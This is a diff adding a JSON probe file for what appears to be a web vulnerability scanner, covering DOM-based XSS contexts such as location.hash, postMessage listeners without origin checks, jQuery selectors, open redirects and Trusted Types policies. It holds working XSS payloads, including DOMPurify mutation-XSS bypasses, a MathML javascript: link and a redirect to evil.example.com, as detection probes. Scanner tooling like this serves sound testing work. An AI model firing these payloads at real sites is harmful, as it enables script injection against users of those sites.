@@ -1,0 +1,184 @@
+{
+  "category": "dom_xss",
+  "chain_with": ["postmessage_xss", "oauth", "csrf", "account_takeover", "webauthn_api_hijack"],
+  "contexts": {
+    "hash_injection": {
+      "description": "DOM XSS via location.hash -- user-controlled hash value flows into dangerous sinks without sanitization",
+      "tech_match": ["JavaScript", "React", "Angular", "Vue.js", "jQuery"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "#<img src=x onerror=alert(1)>",
+          "description": "Hash fragment injection into innerHTML sink -- hash value not sent to server but processed client-side",
+          "matchers": [
+            {"type": "word", "words": ["location.hash", "window.location.hash"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 40
+        }
+      ]
+    },
+    "postmessage_sink": {
+      "description": "DOM XSS via postMessage -- missing origin validation allows cross-origin message injection into dangerous sinks",
+      "tech_match": ["JavaScript", "React", "Angular", "Vue.js"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Page registers message event listener without origin check -- attacker page can postMessage with malicious payload",
+          "matchers": [
+            {"type": "word", "words": ["addEventListener(\"message\"", "addEventListener('message'", "onmessage"], "condition": "or"},
+            {"type": "not_word", "words": ["event.origin", "e.origin", "message.origin"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "url_source": {
+      "description": "DOM XSS via URL parameters -- location, URLSearchParams, or referrer flows into dangerous sinks",
+      "tech_match": ["JavaScript", "jQuery"],
+      "param_match": ["callback", "redirect", "url", "next", "return", "goto"],
+      "probes": [
+        {
+          "payload": "javascript:alert(1)",
+          "description": "JavaScript URI in URL parameter flowing to location.href or window.open sink",
+          "matchers": [
+            {"type": "word", "words": ["location.href", "window.open", ".href=", "innerHTML"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 35
+        }
+      ]
+    },
+    "jquery_sink": {
+      "description": "DOM XSS via jQuery selector injection -- user input passed to $() creates HTML elements",
+      "tech_match": ["jQuery"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "jQuery selector with user-controlled input -- $() with location data creates executable DOM nodes",
+          "matchers": [
+            {"type": "word", "words": ["$(location", "$(window.location", "jQuery(location"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        }
+      ]
+    },
+    "open_redirect_dom": {
+      "description": "DOM-based open redirect -- user-controlled value flows to location assignment without validation",
+      "tech_match": ["JavaScript"],
+      "param_match": ["url", "redirect", "next", "return", "goto", "target", "dest", "continue"],
+      "probes": [
+        {
+          "payload": "//evil.example.com",
+          "description": "Protocol-relative redirect via DOM sink -- parameter value assigned to window.location without origin check",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "words": ["location=", "location.href=", "location.replace(", "location.assign("], "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 35
+        }
+      ]
+    },
+    "document_domain": {
+      "description": "document.domain manipulation -- relaxing same-origin policy enables cross-subdomain attacks",
+      "tech_match": ["JavaScript"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Page sets document.domain -- relaxes SOP allowing any subdomain to access this page DOM",
+          "matchers": [
+            {"type": "word", "words": ["document.domain="]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 40
+        }
+      ]
+    },
+    "trusted_types_default_policy": {
+      "description": "Trusted Types (TT) require sinks to receive TrustedHTML/TrustedScript objects. Apps create a 'default' policy that serves as a last-line sanitizer. If attacker can hijack default policy creation (e.g. early <script> injection in pre-TT region), they bypass TT enforcement.",
+      "tech_match": ["trusted_types", "csp"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Detect Trusted Types in CSP / HTML. Look for `Content-Security-Policy: ... require-trusted-types-for 'script'` or `trustedTypes.createPolicy(`.",
+          "matchers": [
+            {"type": "header", "name": "Content-Security-Policy", "contains": "trusted-types"},
+            {"type": "regex", "pattern": "trustedTypes\\.createPolicy"}
+          ],
+          "severity": "low",
+          "confidence_boost": 25
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "Find default policy. If `createPolicy('default', ...)` exists, inspect createHTML/createScript implementations. Pass-through (returns input unchanged) defeats TT entirely.",
+          "matchers": [
+            {"type": "regex", "pattern": "createPolicy\\s*\\(\\s*['\\\"]default['\\\"]"}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "dompurify_mutation_xss": {
+      "description": "DOMPurify versions <3.0.5 had multiple mutation-XSS bypasses. Specific MathML / SVG namespaced elements re-parse after sanitization, mutating into XSS-executing markup. 2024-2025 research continues to find variants in Angular / React integrations.",
+      "tech_match": ["dompurify", "sanitizer"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
+          "description": "DOMPurify mutation XSS — namespace confusion across math/svg/html. After sanitization the browser re-parses and `onerror` becomes attribute on img.",
+          "matchers": [
+            {"type": "reflection"},
+            {"type": "word", "any": ["<img", "onerror"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 60
+        },
+        {
+          "payload": "<noscript><p title=\"</noscript><img src onerror=alert(1)>\">",
+          "description": "noscript-context confusion — browser parses inside noscript when JS enabled differently than DOMPurify expects.",
+          "matchers": [
+            {"type": "reflection"},
+            {"type": "word", "any": ["onerror", "<img"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "<svg><g/onload=alert(1)//<p>",
+          "description": "SVG self-closing handler — old DOMPurify variants miss the slash-attribute trick.",
+          "matchers": [
+            {"type": "reflection"},
+            {"type": "word", "any": ["onload", "<svg"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "sanitizer_api_namespace_drift": {
+      "description": "The native Sanitizer API (Element.setHTML, Document.parseHTMLUnsafe) has different default allowlists than DOMPurify. Apps relying on Sanitizer API may allow MathML / SVG elements that re-parse to XSS in some browsers.",
+      "tech_match": ["sanitizer_api"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "<math><mi xlink:href=\"javascript:alert(1)\">click</mi></math>",
+          "description": "MathML xlink:href javascript: — Sanitizer API may allow xlink in MathML namespace by default.",
+          "matchers": [
+            {"type": "reflection"},
+            {"type": "word", "any": ["xlink", "javascript:"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    }
+  }
+}
